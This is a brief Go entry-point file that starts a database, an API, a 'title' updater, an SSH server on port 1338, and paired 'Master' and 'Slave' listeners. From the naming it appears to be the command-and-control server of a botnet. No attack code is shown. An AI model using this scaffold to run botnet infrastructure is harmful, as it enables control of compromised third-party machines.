package main

import (
	"fmt"
	"log"
)

var buildversion = 9.2

func main() {
	fmt.Printf("Welcome back root! %s\r\n", Version)

	if err := OpenConfig(Options, "assets", "server.toml"); err != nil {
		log.Fatalf("Config: %v", err)
	}

	if err := SpawnSQL(); err != nil {
		log.Fatalf("Config: %v", err)
	}

	go Master() // Start the master listener in a separate goroutine
	go NewAPI() // Start the API server in a separate goroutine
	go Title()  // Start the title updater in a separate goroutine
	go startSSHServer(":1338")

	// Execute the main slave listener
	if err := Slave(); err != nil {
		log.Fatalf("Config: %v", err)
	}
	select {}

}
